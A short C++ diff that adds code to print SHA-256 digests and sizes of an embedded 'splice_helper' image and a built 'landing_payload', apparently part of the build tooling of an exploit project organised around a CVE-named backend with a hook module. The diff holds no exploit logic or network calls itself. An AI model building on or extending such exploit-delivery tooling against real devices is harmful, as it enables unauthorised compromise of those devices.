@@ -10,7 +10,12 @@
  */
 #include <cstdio>
 
+#include "backend/cve_2026_43284/embed/libcxx_blob.hpp"
+#include "backend/cve_2026_43284/embed/splicehelper_blob.hpp"
+#include "backend/cve_2026_43284/hook/sentry_hook.hpp"
+#include "jni/ops_43284.hpp"
 #include "jni/session_protocol.hpp"
+#include "support/sha256.hpp"
 
 int main() {
     using ghostlock::jni::frame_key_name;
@@ -36,6 +41,26 @@ int main() {
     }
     for (std::int32_t i = 0; i >= -17; --i) {
         std::printf("status\t%s\t%d\n", frame_status_name(static_cast<ghostlock::jni::FrameStatus>(i)), i);
+    }
+    /* 边界那两张图：设备侧会按同样的字节算摘要，两端必须一致，所以摘要也由 native 导出，
+     * 而不是在 Kotlin 里手抄。 */
+    {
+        using namespace ghostlock::backend::cve_2026_43284;
+        char hex[65] = {};
+        const auto *helper = embed::splicehelper_bytes();
+        const std::size_t helper_size = embed::splicehelper_padded_size();
+        ghostlock::support::sha256_hex(ghostlock::support::sha256(helper, helper_size), hex);
+        std::printf("image\tsplice_helper\t%s\n", hex);
+        std::printf("image_size\tsplice_helper\t%zu\n", helper_size);
+        const hook::SentryPlan plan = hook::device_sentry_plan();
+        std::uint8_t payload[1024] = {};
+        std::size_t payload_size = 0U;
+        if (hook::build_sentry_payload(plan, payload, sizeof(payload), payload_size) ==
+            hook::SentryError::Ok) {
+            ghostlock::support::sha256_hex(ghostlock::support::sha256(payload, payload_size), hex);
+            std::printf("image\tlanding_payload\t%s\n", hex);
+            std::printf("image_size\tlanding_payload\t%zu\n", payload_size);
+        }
     }
     return 0;
 }
